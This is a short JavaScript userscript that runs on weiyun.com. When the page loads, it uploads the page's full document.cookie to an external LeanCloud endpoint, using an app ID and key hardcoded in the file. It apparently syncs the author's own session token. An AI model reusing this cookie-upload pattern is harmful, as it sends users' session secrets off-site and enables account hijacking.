$(document).ready(() => {
  var host = location.host;
  if (!host.includes('weiyun.com')) return;
  /*
  X-LC-Id: 8alQIE7rUNqk6Y7DqxPgrJvK-gzGzoHsz
  X-LC-Key: s6OpPBU2VdcU0o8F2GifMgVT
  */
  const headers = {
    'X-LC-Id': '8alQIE7rUNqk6Y7DqxPgrJvK-gzGzoHsz',
    'X-LC-Key': 's6OpPBU2VdcU0o8F2GifMgVT'
  };

  nx.waitToDisplay('.mod-act-group .act-item-txt', 1000, (el) => {
    gmsdk.http
      .put({
        url: 'https://8alqie7r.lc-cn-n1-shared.com/1.1/classes/token/60f4d3a42c88c922c2e16a39',
        data: { weiyun_token: document.cookie },
        headers
      })
      .then((res) => {
        console.log('WEIYUN TOKEN has update.');
      });
  });
});
